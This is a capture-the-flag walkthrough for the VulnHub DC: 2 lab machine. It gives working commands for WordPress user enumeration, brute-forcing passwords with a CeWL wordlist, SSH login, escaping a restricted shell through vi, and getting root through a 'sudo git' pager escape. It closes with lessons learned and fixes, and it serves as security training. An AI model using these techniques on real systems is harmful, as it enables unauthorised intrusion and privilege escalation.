# DC: 2 — Writeup

| | |
|-|-|
| **Target IP** | 192.168.1.101 (host-only) |
| **Difficulty** | Beginner |
| **OS** | Linux |
| **Root Flag** | /root/final-flag.txt |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/dc-2,311/) |

## Attack Summary

WordPress on port 80 → WPScan user enum + CeWL wordlist → brute force → tom:parturient → SSH on port 7744 → rbash escape via vi → sudo git → root shell.

## Methodology

1. Network discovery; find non-standard SSH port (7744)
2. WordPress user enumeration with WPScan
3. Custom wordlist via CeWL; brute force credentials
4. SSH login as `tom` (restricted shell)
5. Escape rbash via `vi`
6. Escalate via `sudo git help` GTFOBin

---

## Step 1: Network Discovery

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
nmap -p- -A 192.168.1.101
```

Expected ports:

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache 2.4.10 (Debian) - WordPress
7744/tcp open  ssh     OpenSSH 6.7p1 Debian
```

The WordPress site redirects to `http://dc-2`. Add the hostname to your hosts file:

```bash
echo "192.168.1.101 dc-2" | sudo tee -a /etc/hosts
```

![Nmap scan](images/01-nmap.png)

---

## Step 2: WordPress Enumeration

```bash
wpscan --url http://dc-2 --enumerate p --enumerate t --enumerate u
```

Users discovered: **admin**, **jerry**, **tom**.

A page titled "Flag" is visible on the site and contains a hint: use CeWL to build a targeted wordlist.

![WordPress enum](images/02-wordpress-enum.png)

---

## Step 3: Build Wordlist and Brute Force

Generate a wordlist from site content:

```bash
cewl http://dc-2/ > passwords.txt
```

Save usernames to a file:

```bash
echo -e "admin\njerry\ntom" > users.txt
```

Brute force with WPScan:

```bash
wpscan --url http://dc-2 -U users.txt -P passwords.txt
```

Credentials recovered:

| User | Password |
|------|----------|
| jerry | adipiscing |
| tom | parturient |

![WPScan brute force results](images/03-wpscan-brute.png)

---

## Step 4: SSH as `tom`

WordPress credentials don't give a shell. SSH is the path forward:

```bash
ssh tom@192.168.1.101 -p 7744
```

Password: `parturient`

The shell is **rbash** (restricted bash). Only a handful of binaries in `/bin` are available and `cat` is missing. `vi` is accessible.

---

## Step 5: Escape rbash via `vi`

Inside the restricted shell:

```bash
vi
```

Within vi, drop to a proper shell:

```
:set shell=/bin/bash
:shell
```

Fix the PATH:

```bash
export PATH=/bin:/usr/bin:$PATH
export SHELL=/bin/bash
```

---

## Step 6: Privilege Escalation via `sudo git`

```bash
sudo -l
```

Output confirms `tom` can run `/usr/bin/git` as root without a password.

Use the git GTFOBin:

```bash
sudo git help add
```

The help output opens in the system pager. Type the following and press Enter:

```
!/bin/bash
```

A root shell spawns. Read the final flag:

```bash
cat /root/final-flag.txt
```

![Git privesc to root](images/04-git-privesc.png)
![Root flag](images/05-root-flag.png)

---

## Lessons Learned

1. **Non-standard ports** (SSH on 7744) are trivially found with `nmap -p-`; security through obscurity fails.
2. **CeWL** generates targeted wordlists from site content and is often more effective than generic lists against real users.
3. **rbash** is a weak restriction — `vi`, `python`, `less`, `awk` and many others can escape it.
4. **sudo misconfiguration**: `git` can run system commands via pager. Always audit sudoers with `sudo -l`.
5. GTFOBins at https://gtfobins.github.io/ covers dozens of sudo-exploitable binaries.

## Remediation

| Vulnerability | Fix |
|---------------|-----|
| Weak WordPress passwords | Enforce strong password policy; use 2FA |
| rbash escape | Do not rely on rbash for security; use proper role separation |
| `sudo git` NOPASSWD | Remove from sudoers; never grant unrestricted git as root |
| Predictable wordlist passwords | Train users, enforce complexity requirements |
